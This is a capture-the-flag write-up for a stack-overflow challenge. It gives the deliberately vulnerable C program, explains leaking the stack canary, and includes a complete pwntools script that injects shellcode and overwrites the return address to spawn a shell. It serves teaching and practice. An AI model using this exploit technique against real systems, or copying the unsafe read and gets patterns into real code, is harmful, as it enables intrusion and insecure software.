# Write-up of the challenge "Return to Shellcode"

This challenge is part of the "Binary exploitation" category and is in **Level 2**.

# Goal of the challenge

The objective of this challenge is to bypass the canary and overwrite the **RIP** with the **input buffer**, that has the shell

## Program structure

```c
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}


```


## Security breach

The two vulnerabilties here are:

1) **read(0, buf, 0x100);**, the buff is 0x50 but it is reading 0x100

2) **gets(buf);**, the buff is 0x50 but it is reading much more.


## Solution

So I started first by finding the **RBP**, since the canary is often 8 bytes before the RBP. If we look at the source code the buffer is **0x50**, in normal cases the **RIP** should be at **0x50 + 8**, but since we have a canary the **RIP** is at **0x50 + 16**. 

So first we use the first payload to leak the canary but since some **String functions** will stop at **Null bytes**, we need to hop over the first byte since canaries often start with **\x00**.

After leaking the canary successfully, we just have to put our shell and put the canary 8 bytes before the **RBP** and then add **8 bytes** to reach **RIP** and overwrite it with the **buffer**, which we get off the program.

solve.py:

```python
from pwn import *

context.arch = "amd64"


p = process('./r2s')
# p = remote('host3.dreamhack.games', 9851)

p.recvuntil("Address of the buf: ")
leak_buff = int(p.recv(14), 16)

print(leak_buff)

payload = b'A' * 89
p.sendafter("Input: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recv(7))


shellcode = asm(shellcraft.sh())

offset_to_rbp = 88

payload = shellcode
payload += b'A' * (offset_to_rbp - len(shellcode))
payload += p64(canary)
payload += b"A" * 8
payload += p64(leak_buff)

p.sendafter("Input: ", payload)


p.interactive()

```